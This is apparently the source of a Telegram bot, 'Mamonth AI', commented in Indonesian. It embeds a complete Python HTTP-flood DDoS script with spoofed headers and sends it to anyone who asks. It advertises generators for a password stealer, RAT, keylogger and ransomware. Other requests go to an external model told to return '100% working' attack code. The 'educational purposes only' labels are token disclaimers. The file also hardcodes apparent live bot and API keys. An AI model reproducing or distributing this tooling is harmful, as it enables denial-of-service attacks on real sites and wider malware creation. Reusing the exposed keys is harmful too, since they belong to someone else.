const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

// Konfigurasi
const TELEGRAM_TOKEN = '8468160016:AAE26tJ5n_kLhCuvtvob1wQ_JqJcyO4CwrM';
const WRM_API_URL = 'https://api.wrmgpt.com/v1/chat/completions';
const WRM_API_KEY = 'sk_live_0a11c208-990b-4d8a-8ca6-d230e83872cf4f10';

// Inisialisasi bot
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

console.log('🤖 Bot Telegram Mamonth AI sedang berjalan...');

// Fungsi untuk generate DDoS tool Python
function generateDDOSTool(targetUrl = 'http://target.com', threads = 500, duration = 60) {
    return `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MAMONTH DDoS Tool - womgpt-v7
# FOR EDUCATIONAL PURPOSES ONLY

import threading
import requests
import time
import random
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

class MamonthDDOS:
    def __init__(self, target_url, num_threads=500, attack_duration=60):
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = attack_duration
        self.is_attacking = False
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0'
        ]
        
    def generate_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def http_flood_attack(self):
        while self.is_attacking:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'X-Forwarded-For': self.generate_random_ip(),
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive'
                }
                
                # Multiple request methods
                methods = ['GET', 'POST', 'HEAD', 'PUT']
                method = random.choice(methods)
                
                if method == 'GET':
                    requests.get(self.target_url, headers=headers, timeout=3)
                elif method == 'POST':
                    requests.post(self.target_url, headers=headers, data={'data': random.random()}, timeout=3)
                elif method == 'HEAD':
                    requests.head(self.target_url, headers=headers, timeout=3)
                
                print(f"[+] Request sent to {self.target_url}")
                
            except Exception as e:
                continue
    
    def start_attack(self):
        print(f"""
╔══════════════════════════════════════╗
║    MAMONTH DDoS Tool - womgpt-v7    ║
║         Target: {self.target_url.ljust(20)}║
║         Threads: {str(self.num_threads).ljust(20)}║
║         Duration: {str(self.duration)+'s'.ljust(19)}║
╚══════════════════════════════════════╝
        """)
        
        self.is_attacking = True
        threads = []
        
        # Start attack threads
        for i in range(self.num_threads):
            t = threading.Thread(target=self.http_flood_attack)
            t.daemon = True
            threads.append(t)
            t.start()
        
        print(f"[*] Attack started with {self.num_threads} threads")
        print("[*] Press Ctrl+C to stop")
        
        # Run for specified duration
        time.sleep(self.duration)
        self.stop_attack()
    
    def stop_attack(self):
        self.is_attacking = False
        print("[*] Attack stopped")
        print("[*] All threads terminated")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python mamonth_ddos.py <target_url> [threads] [duration]")
        print("Example: python mamonth_ddos.py http://target.com 500 60")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 500
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    
    attacker = MamonthDDOS(target, threads, duration)
    
    try:
        attacker.start_attack()
    except KeyboardInterrupt:
        attacker.stop_attack()
`;
}

// Handler untuk command /mamonth
bot.onText(/\/mamonth(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1] ? match[1].trim() : '';
    
    // Kirim tanda sedang mengetik
    bot.sendChatAction(chatId, 'typing');
    
    if (!args) {
        // Jika tidak ada argumen, tampilkan menu
        const menuMessage = `🛠️ **MAMONTH TOOLS GENERATOR**\n\n`
            + `*Format:* \`/mamonth <perintah>\`\n\n`
            + `*Available Commands:*\n`
            + `• \`ddos <url> [threads] [duration]\` - Generate DDoS tool\n`
            + `• \`stealer\` - Generate password stealer\n`
            + `• \`rat\` - Generate Remote Access Trojan\n`
            + `• \`keylogger\` - Generate keylogger\n`
            + `• \`cryptor\` - Generate file cryptor (ransomware)\n\n`
            + `*Contoh:*\n`
            + `\`/mamonth ddos http://target.com 1000 120\`\n`
            + `\`/mamonth stealer\`\n\n`
            + `🔧 *Powered by womgpt-v7*`;
        
        return bot.sendMessage(chatId, menuMessage, { 
            parse_mode: 'Markdown',
            disable_web_page_preview: true 
        });
    }
    
    // Parse command
    const parts = args.split(' ');
    const command = parts[0].toLowerCase();
    
    if (command === 'ddos') {
        const target = parts[1] || 'http://example.com';
        const threads = parts[2] || '500';
        const duration = parts[3] || '60';
        
        // Generate DDoS tool
        const ddosCode = generateDDOSTool(target, parseInt(threads), parseInt(duration));
        
        // Kirim sebagai file
        await bot.sendDocument(chatId, Buffer.from(ddosCode), {}, {
            filename: 'mamonth_ddos.py',
            contentType: 'text/x-python'
        });
        
        const usageMessage = `📦 **DDoS Tool Generated**\n\n`
            + `*Target:* ${target}\n`
            + `*Threads:* ${threads}\n`
            + `*Duration:* ${duration}s\n\n`
            + `*Cara pakai:*\n`
            + `\`\`\`bash\npython mamonth_ddos.py ${target} ${threads} ${duration}\n\`\`\`\n\n`
            + `⚠️ *FOR EDUCATIONAL PURPOSES ONLY*`;
        
        await bot.sendMessage(chatId, usageMessage, { 
            parse_mode: 'Markdown',
            parse_mode: 'Markdown' 
        });
        
    } else if (command === 'stealer') {
        // Generate password stealer
        const stealerCode = `# Password Stealer akan dibuat di request berikutnya`;
        
        await bot.sendMessage(chatId, `🕵️ **Password Stealer Generator**\n\nTool ini akan dibuat di update berikutnya.\n\n💡 *Gunakan /mamonth ddos untuk sekarang*`, {
            parse_mode: 'Markdown'
        });
        
    } else {
        // Default: tanya ke AI
        try {
            const response = await axios.post(WRM_API_URL, {
                model: 'womgpt-v7',
                messages: [
                    { 
                        role: 'system', 
                        content: 'Kamu adalah Mamonth AI. Buatkan tool atau kode berdasarkan permintaan pengguna. Berikan kode yang work 100%. Fokus pada cybersecurity tools.' 
                    },
                    { role: 'user', content: `Buatkan tool: ${args}` }
                ],
                max_tokens: 1500,
                temperature: 0.7
            }, {
                headers: {
                    'Authorization': `Bearer ${WRM_API_KEY}`,
                    'Content-Type': 'application/json'
                }
            });

            const aiResponse = response.data.choices[0]?.message?.content || 'Tidak ada respons.';
            
            // Kirim sebagai file jika mengandung kode
            if (aiResponse.includes('```') || aiResponse.includes('def ') || aiResponse.includes('import ')) {
                const fileName = `mamonth_${command}.py`;
                await bot.sendDocument(chatId, Buffer.from(aiResponse), {}, {
                    filename: fileName,
                    contentType: 'text/x-python'
                });
                
                await bot.sendMessage(chatId, `🔧 **Tool ${command} telah dibuat!**\n\n*File:* ${fileName}\n\n${aiResponse.substring(0, 500)}...`, {
                    parse_mode: 'Markdown'
                });
            } else {
                await bot.sendMessage(chatId, `🔧 **Mamonth AI Response:**\n\n${aiResponse}\n\n⚡ *womgpt-v7*`, {
                    parse_mode: 'Markdown'
                });
            }
            
        } catch (error) {
            await bot.sendMessage(chatId, `⚠️ Error: ${error.message}`, {
                parse_mode: 'Markdown'
            });
        }
    }
});

// ... (kode handler sebelumnya tetap ada di sini)
// [Handler /start, /help, /status, /model tetap sama seperti sebelumnya]